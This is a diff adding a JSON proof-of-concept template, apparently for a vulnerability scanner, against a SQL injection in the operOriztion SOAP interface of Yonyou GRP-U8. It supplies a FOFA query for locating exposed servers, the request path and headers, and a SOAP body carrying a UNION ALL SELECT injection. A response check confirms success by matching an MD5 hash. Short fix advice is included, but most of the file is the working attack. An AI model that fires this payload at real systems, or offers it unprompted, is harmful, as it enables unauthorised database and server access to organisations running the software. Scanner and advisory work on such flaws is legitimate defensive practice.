@@ -1,0 +1,43 @@
+{
+  "product": "",
+  "vul_name": "用友GRP U8 operOriztion接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友GRP-U8R10行政事业内控管理软件 operOriztion接口处存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-GRP-U8\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/weixin_52204925/article/details/137941912",
+  "fix": [
+    "使用参数化查询或存储过程来执行 SQL 查询，以防止注入攻击。",
+    "及时应用安全更新和补丁，以修复任何已发现的漏洞。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/services/operOriztion",
+      "header": {
+        "Content-Type": "text/xml;charset=UTF-8",
+        "SOAPAction": ""
+      },
+      "data": "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsdd=\"http://xml.apache.org/axis/wsdd/\">\n<soapenv:Header/>\n<soapenv:Body>\n<wsdd:getGsbmfaByKjnd soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n<kjnd xsi:type=\"xsd:string\">' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5',123456))-- </kjnd>\n</wsdd:getGsbmfaByKjnd>\n</soapenv:Body>\n</soapenv:Envelope>"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
